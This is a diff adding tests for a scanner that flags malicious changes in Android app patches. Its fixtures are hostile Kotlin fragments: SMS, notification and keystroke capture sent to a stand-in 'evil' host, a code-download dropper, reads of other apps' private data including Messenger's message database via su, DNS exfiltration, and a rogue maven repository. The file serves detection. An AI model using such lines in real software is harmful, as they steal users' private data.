@@ -125,3 +125,81 @@ describe("v2 smart rules", () => {
     assert.ok(r.findings.some((x) => x.severity === "high" && /across windows/.test(x.reason)));
   });
 });
+
+describe("v3 critical and sneaky tricks", () => {
+  const EVIL = "https://evil.example.evil123/submit";
+  it("flags SMS interception with network as critical", () => {
+    const d = diffFor("patches/Sms.kt", ["val msg = SmsMessage.createFromPdu(pdu)", "OkHttp.newCall(req(\"" + EVIL + "\")).execute()"]);
+    const f = scanDiff(d, cfg);
+    assert.ok(f.some((x) => x.severity === "critical" && /SMS/i.test(x.reason)));
+  });
+  it("flags notification/accessibility capture with external host as critical", () => {
+    const d = diffFor("patches/Spy.kt", ["class L : NotificationListenerService()", "post(\"" + EVIL + "\", notificationText)"]);
+    const f = scanDiff(d, cfg);
+    assert.ok(f.some((x) => x.severity === "critical"));
+  });
+  it("does not flag accessibility service alone (no network)", () => {
+    const d = diffFor("patches/A11y.kt", ["class H : AccessibilityService()", "override fun onAccessibilityEvent(e: AccessibilityEvent) {}"]);
+    assert.equal(scanDiff(d, cfg).length, 0);
+  });
+  it("flags keystroke capture with network as critical", () => {
+    const d = diffFor("patches/Kb.kt", ["override fun onKeyEvent(e: KeyEvent)", "socket.send(keyCode)", "val u = \"" + EVIL + "\""]);
+    const f = scanDiff(d, cfg);
+    assert.ok(f.some((x) => x.severity === "critical" && /keystroke/i.test(x.reason)));
+  });
+  it("flags runtime code download plus execution as critical", () => {
+    const d = diffFor("patches/Dyn.kt", ["val cl = DexClassLoader(dexPath, od, null, cl)", "download(\"" + EVIL + "\", dexPath)"]);
+    const f = scanDiff(d, cfg);
+    assert.ok(f.some((x) => x.severity === "critical" && /dropper|download/i.test(x.reason)));
+  });
+  it("does not flag dynamic loading alone (extension mechanism)", () => {
+    const d = diffFor("patches/Ext.kt", ["val cl = DexClassLoader(localPath, od, null, cl)"]);
+    assert.equal(scanDiff(d, cfg).length, 0);
+  });
+  it("flags cross-app private data read with network as critical", () => {
+    const d = diffFor("patches/Steal.kt", ["open(\"/data/data/com.zing.zalo/shared_prefs/x.xml\")", "post(\"" + EVIL + "\", data)"]);
+    const f = scanDiff(d, cfg);
+    assert.ok(f.some((x) => x.severity === "critical" && /cross-app|other app|private/i.test(x.reason)));
+  });
+  it("flags su plus stolen data path as critical", () => {
+    const d = diffFor("patches/Root.kt", ["Runtime.getRuntime().exec(\"su -c cat /data/data/com.facebook.orca/databases/threads.db\")"]);
+    const f = scanDiff(d, cfg);
+    assert.ok(f.some((x) => x.severity === "critical"));
+  });
+  it("flags WebView JS bridge with network sink as high", () => {
+    const d = diffFor("patches/Wv.kt", ["wv.addJavascriptInterface(obj, \"a\")", "OkHttp.newCall(u).execute()"]);
+    const f = scanDiff(d, cfg);
+    assert.ok(f.some((x) => x.severity === "high" && /bridge/i.test(x.reason)));
+  });
+  it("flags DNS-plus-encoding combo as high (DNS exfil)", () => {
+    const d = diffFor("patches/Dns.kt", ["val ip = InetAddress.getByName(Base64.encodeToString(id))"]);
+    const f = scanDiff(d, cfg);
+    assert.ok(f.some((x) => x.severity === "high" && /DNS/i.test(x.reason)));
+  });
+  it("flags new external maven repository as high (supply chain)", () => {
+    const d = diffFor("app/build.gradle.kts", ["maven { url = uri(\"https://evil-maven.example.evil123/m2\") }"]);
+    const f = scanDiff(d, cfg);
+    assert.equal(f.length, 1);
+    assert.equal(f[0].severity, "high");
+  });
+  it("notes new external dependency as info", () => {
+    const d = diffFor("app/build.gradle.kts", ["implementation(\"com.evil:lib:1.0\")"]);
+    const f = scanDiff(d, cfg);
+    assert.equal(f.length, 1);
+    assert.equal(f[0].severity, "info");
+  });
+  it("flags typosquat of allowlisted domain as high", () => {
+    const d = diffFor("patches/Api.kt", ["val u = \"https://morphe-softwrae.com/api\""]);
+    const f = scanDiff(d, cfg);
+    assert.ok(f.some((x) => x.severity === "high" && /typosquat/i.test(x.reason)));
+  });
+  it("flags screen/mic capture with network sink as high", () => {
+    const d = diffFor("patches/Rec.kt", ["val pm = mediaProjectionManager", "OkHttp.newCall(upload(stream)).execute()", "MediaProjection probe"]);
+    const f = scanDiff(d, cfg);
+    assert.ok(f.some((x) => x.severity === "high" && /capture/i.test(x.reason)));
+  });
+  it("does not flag plain reflection without network", () => {
+    const d = diffFor("patches/Hook.kt", ["val m = cls.getDeclaredMethod(\"doPay\")", "m.isAccessible = true"]);
+    assert.equal(scanDiff(d, cfg).length, 0);
+  });
+});
